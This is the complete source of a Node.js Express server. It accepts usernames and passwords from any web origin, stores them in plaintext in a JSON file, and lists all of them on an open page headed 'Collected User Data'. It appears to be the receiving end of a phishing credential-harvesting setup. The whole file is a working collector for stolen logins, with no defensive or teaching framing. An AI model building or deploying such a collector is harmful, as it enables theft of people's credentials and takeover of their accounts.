const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'userData.json');

// Middleware
app.use(cors({
    origin: '*', // Allow all origins, you can restrict this in production
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));
app.use(express.json());

// Ensure data file exists
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// POST endpoint to receive form data
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing required fields' });
    }

    // Read existing data
    const existingData = JSON.parse(fs.readFileSync(DATA_FILE));
    
    // Add new entry
    const newEntry = {
        username,
        password,
        timestamp: new Date().toISOString()
    };
    
    existingData.push(newEntry);
    
    // Write updated data back to file
    fs.writeFileSync(DATA_FILE, JSON.stringify(existingData, null, 2));
    
    res.json({ success: true });
});

// GET endpoint to display all collected data
app.get('/', (req, res) => {
    try {
        const data = JSON.parse(fs.readFileSync(DATA_FILE));
        
        // Generate HTML
        const html = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Collected User Data</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        margin: 20px;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                        margin-top: 20px;
                    }
                    th, td {
                        border: 1px solid #ddd;
                        padding: 8px;
                        text-align: left;
                    }
                    th {
                        background-color: #f2f2f2;
                    }
                    h1 {
                        color: #0070ba;
                    }
                </style>
            </head>
            <body>
                <h1>Collected User Data</h1>
                <table>
                    <thead>
                        <tr>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Timestamp</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${data.map(entry => `
                            <tr>
                                <td>${escapeHtml(entry.username)}</td>
                                <td>${escapeHtml(entry.password)}</td>
                                <td>${escapeHtml(entry.timestamp)}</td>
                            </tr>
                        `).join('')}
                    </tbody>
                </table>
            </body>
            </html>
        `;
        
        res.send(html);
    } catch (error) {
        res.status(500).send('Error loading data');
    }
});

// HTML escape function to prevent XSS
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
